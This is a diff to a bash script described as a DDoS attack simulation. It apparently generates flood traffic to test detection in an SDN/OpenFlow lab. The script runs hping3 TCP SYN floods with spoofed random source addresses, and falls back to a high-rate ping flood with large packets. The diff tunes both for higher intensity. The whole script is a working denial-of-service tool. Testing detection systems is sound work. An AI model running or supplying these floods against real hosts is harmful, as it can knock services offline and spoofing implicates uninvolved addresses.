@@ -1,33 +1,28 @@
 #!/bin/bash
-# DDoS Attack Simulation - High-rate flooding attack (Optimized)
+# DDoS Attack Simulation - High-intensity Optimized version
 
 TARGET=$1
 DURATION=${2:-30}
-RATE=${3:-2000}  # target rate in packets per second (for non-flood modes)
+RATE=${3:-2000} 
 
 if [ -z "$TARGET" ]; then
     echo "Usage: $0 <target_ip> [duration_seconds] [rate_pps]"
     exit 1
 fi
 
-echo "Starting DDoS attack on $TARGET for $DURATION seconds..."
+echo "Starting High-Intensity DDoS on $TARGET for $DURATION seconds..."
 
-# Method 1: Use hping3 (Preferred for SDN testing)
-# This sends TCP SYN packets which are more likely to trigger flow entries 
-# in the OpenFlow switch and detection in your controller.
 if command -v hping3 &> /dev/null; then
-    echo "Using hping3 for TCP SYN flood (Half-Open attack)..."
-    # -S: SYN flag, -p 80: target port, --flood: as fast as possible, --rand-source: spoofed IPs
-    timeout $DURATION sudo hping3 -S -p 80 --flood --rand-source $TARGET > /dev/null 2>&1
-    
-# Method 2: High-rate native Ping Flood
-# This uses the native Linux flood flag (-f) which is much faster than Bash loops.
+    echo "Using hping3 for Randomized TCP SYN Flood..."
+    # --rand-source: Spoofs IPs to increase entropy
+    # -d 120: Adds payload data to increase byte_count
+    # -i u500: Sends a packet every 500 microseconds (extremely fast)
+    timeout $DURATION sudo hping3 -S -p 80 --flood --rand-source -d 120 -i u500 $TARGET > /dev/null 2>&1
 else
-    echo "hping3 not found. Using native ICMP flood..."
-    # -f: Flood mode (outputs dots for sent, backspaces for received)
-    # -l: Preload (sends specified number of packets without waiting for reply)
-    # -s: Packet size (1400 bytes to saturate bandwidth)
-    timeout $DURATION sudo ping -f -l $RATE -s 1400 $TARGET > /dev/null 2>&1
+    echo "Using Native Flood with increased payload..."
+    # -s 1450: Maximize packet size to trigger byte-rate features
+    # -f: Native kernel-level flood
+    timeout $DURATION sudo ping -f -l $RATE -s 1450 $TARGET > /dev/null 2>&1
 fi
 
 echo "DDoS attack completed"
